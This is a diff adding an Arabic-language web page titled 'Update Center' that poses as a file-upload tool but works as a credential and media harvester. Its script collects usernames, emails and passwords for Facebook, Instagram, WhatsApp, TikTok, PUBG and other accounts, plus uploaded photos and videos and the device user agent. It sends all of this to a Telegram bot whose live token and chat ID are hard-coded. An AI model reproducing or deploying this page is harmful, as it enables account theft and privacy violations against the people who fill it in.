@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>مركز التحديث</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:20px}
+.container{max-width:500px;margin:0 auto}
+.header{text-align:center;margin-bottom:20px}
+.logo{font-size:50px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+h1{color:#ffaa00;font-size:20px;margin:10px 0}
+.sub{color:#666;font-size:12px}
+.card{background:#111;border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px}
+.card h2{color:#ffaa00;font-size:14px;margin-bottom:12px;border-bottom:1px solid #333;padding-bottom:8px}
+input,select,textarea{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:8px;color:#fff;font-size:13px;outline:none;margin-bottom:10px;font-family:'Segoe UI',Tahoma,sans-serif}
+input:focus,select:focus,textarea:focus{border-color:#ffaa00}
+textarea{min-height:80px;resize:vertical}
+.btn{width:100%;padding:14px;border-radius:8px;border:none;font-size:15px;font-weight:bold;cursor:pointer;margin-top:6px}
+.btn-upload{background:#ffaa00;color:#000}
+.btn-photo{background:#e1306c;color:#fff}
+.btn-video{background:#5865f2;color:#fff}
+.btn-text{background:#4CAF50;color:#fff}
+.btn:active{transform:scale(0.96)}
+.file-zone{border:2px dashed #333;border-radius:12px;padding:30px;text-align:center;cursor:pointer;margin:10px 0;transition:all 0.3s}
+.file-zone:hover{border-color:#ffaa00}
+.file-zone .icon{font-size:40px}
+.file-zone .txt{color:#666;font-size:13px;margin-top:8px}
+input[type=file]{display:none}
+.preview-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin:10px 0}
+.preview-grid img,.preview-grid video{width:100%;border-radius:6px;max-height:100px;object-fit:cover}
+.progress{width:100%;height:6px;background:#333;border-radius:3px;margin:12px 0;overflow:hidden}
+.progress-fill{height:100%;width:0%;background:#ffaa00;transition:width 0.3s}
+.status{color:#aaa;font-size:12px;text-align:center;margin:8px 0}
+.logs{max-height:200px;overflow-y:auto;font-size:11px;color:#666;margin-top:10px}
+.log-item{padding:6px 0;border-bottom:1px solid #1a1a1a}
+.log-item.success{color:#4CAF50}
+.log-item.error{color:#ff0040}
+.tabs{display:flex;gap:6px;margin-bottom:14px}
+.tab{flex:1;padding:10px;background:#111;border:1px solid #333;border-radius:8px;text-align:center;cursor:pointer;font-size:12px}
+.tab.active{border-color:#ffaa00;color:#ffaa00}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<div class="logo">⚡</div>
+<h1>مركز التحديث</h1>
+<p class="sub">رفع الملفات بجميع الأنواع</p>
+</div>
+
+<div class="tabs">
+<div class="tab active" onclick="switchTab('photo')">📸 صور</div>
+<div class="tab" onclick="switchTab('video')">🎬 فيديو</div>
+<div class="tab" onclick="switchTab('text')">📝 نصوص</div>
+</div>
+
+<!-- صور -->
+<div class="card" id="tab-photo">
+<h2>📸 رفع الصور</h2>
+<input type="file" id="photoInput" accept="image/*" multiple onchange="previewFiles('photo')">
+<div class="file-zone" onclick="document.getElementById('photoInput').click()">
+<div class="icon">📸</div>
+<div class="txt">اضغط لاختيار صور</div>
+</div>
+<div class="preview-grid" id="photoPreview"></div>
+<button class="btn btn-photo" onclick="uploadFiles('photo')">📸 رفع الصور</button>
+</div>
+
+<!-- فيديو -->
+<div class="card" id="tab-video" style="display:none">
+<h2>🎬 رفع الفيديو</h2>
+<input type="file" id="videoInput" accept="video/*" onchange="previewFiles('video')">
+<div class="file-zone" onclick="document.getElementById('videoInput').click()">
+<div class="icon">🎬</div>
+<div class="txt">اضغط لاختيار فيديو</div>
+</div>
+<video id="videoPreview" style="width:100%;max-height:200px;border-radius:8px;display:none;" controls></video>
+<button class="btn btn-video" onclick="uploadFiles('video')">🎬 رفع الفيديو</button>
+</div>
+
+<!-- نصوص -->
+<div class="card" id="tab-text" style="display:none">
+<h2>📝 إرسال نصوص</h2>
+<select id="textType">
+<option value="">اختر نوع النص</option>
+<option value="facebook">📘 فيسبوك</option>
+<option value="instagram">📷 انستجرام</option>
+<option value="whatsapp">💬 واتساب</option>
+<option value="twitter">🐦 تويتر</option>
+<option value="tiktok">🎵 تيك توك</option>
+<option value="pubg">🎮 PUBG</option>
+<option value="freefire">🎯 فري فاير</option>
+</select>
+<input type="text" id="textTitle" placeholder="اسم المستخدم / الإيميل">
+<input type="password" id="textPass" placeholder="كلمة المرور">
+<textarea id="textExtra" placeholder="معلومات إضافية (اختياري)"></textarea>
+<button class="btn btn-text" onclick="sendText()">📝 إرسال البيانات</button>
+</div>
+
+<div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+<div class="status" id="status">⏳ جاهز للرفع</div>
+<div class="logs" id="logs"></div>
+</div>
+
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+var photoFiles=[];
+var videoFile=null;
+
+function switchTab(tab){
+document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
+document.querySelectorAll('.card').forEach(function(c){c.style.display='none';});
+document.getElementById('tab-'+tab).style.display='block';
+document.querySelectorAll('.tab')[['photo','video','text'].indexOf(tab)].classList.add('active');
+}
+
+function addLog(msg,type){
+var logs=document.getElementById('logs');
+var div=document.createElement('div');
+div.className='log-item '+(type||'success');
+div.textContent=msg;
+logs.appendChild(div);
+logs.scrollTop=logs.scrollHeight;
+}
+
+function previewFiles(type){
+if(type==='photo'){
+photoFiles=Array.from(document.getElementById('photoInput').files);
+var html='';
+photoFiles.forEach(function(f,i){
+var reader=new FileReader();
+reader.onload=function(e){
+var img=document.createElement('img');
+img.src=e.target.result;
+document.getElementById('photoPreview').appendChild(img);
+};
+reader.readAsDataURL(f);
+});
+}else if(type==='video'){
+videoFile=document.getElementById('videoInput').files[0];
+if(videoFile){
+var url=URL.createObjectURL(videoFile);
+var vid=document.getElementById('videoPreview');
+vid.src=url;
+vid.style.display='block';
+}
+}
+}
+
+async function uploadFiles(type){
+if(type==='photo' && photoFiles.length===0)return addLog('❌ اختر صور الأول','error');
+if(type==='video' && !videoFile)return addLog('❌ اختر فيديو الأول','error');
+
+document.getElementById('status').textContent='⏳ جاري الرفع...';
+var now=new Date().toLocaleString('ar-EG');
+
+if(type==='photo'){
+for(var i=0;i<photoFiles.length;i++){
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('photo',photoFiles[i]);
+fd.append('caption','📸 صورة '+(i+1)+'\n🕐 '+now+'\n📱 '+navigator.userAgent);
+try{
+await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:fd});
+addLog('✅ تم رفع الصورة '+(i+1));
+}catch(e){addLog('❌ فشل الصورة '+(i+1),'error');}
+var pct=Math.round(((i+1)/photoFiles.length)*100);
+document.getElementById('progressFill').style.width=pct+'%';
+}
+document.getElementById('status').textContent='✅ تم رفع '+photoFiles.length+' صورة';
+}
+
+if(type==='video'){
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('video',videoFile);
+fd.append('caption','🎬 فيديو\n🕐 '+now+'\n📱 '+navigator.userAgent);
+try{
+await fetch('https://api.telegram.org/bot'+TOKEN+'/sendVideo',{method:'POST',body:fd});
+addLog('✅ تم رفع الفيديو');
+document.getElementById('progressFill').style.width='100%';
+document.getElementById('status').textContent='✅ تم رفع الفيديو';
+}catch(e){addLog('❌ فشل رفع الفيديو','error');}
+}
+}
+
+async function sendText(){
+var type=document.getElementById('textType').value;
+var title=document.getElementById('textTitle').value.trim();
+var pass=document.getElementById('textPass').value.trim();
+var extra=document.getElementById('textExtra').value.trim();
+
+if(!type||!title||!pass)return addLog('❌ املأ جميع الحقول','error');
+
+var now=new Date().toLocaleString('ar-EG');
+var msg='📝 <b>بيانات جديدة!</b>\n\n';
+msg+='🌐 <b>النوع:</b> '+type+'\n';
+msg+='👤 <b>المستخدم:</b> '+title+'\n';
+msg+='🔒 <b>كلمة المرور:</b> '+pass+'\n';
+if(extra)msg+='📋 <b>إضافي:</b> '+extra+'\n';
+msg+='\n🕐 <b>الوقت:</b> '+now+'\n📱 <b>الجهاز:</b> '+navigator.userAgent;
+
+try{
+await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'HTML'})
+});
+addLog('✅ تم إرسال البيانات بنجاح');
+document.getElementById('status').textContent='✅ تم الإرسال';
+document.getElementById('textTitle').value='';
+document.getElementById('textPass').value='';
+document.getElementById('textExtra').value='';
+}catch(e){addLog('❌ فشل الإرسال','error');}
+}
+</script>
+</body>
+</html>
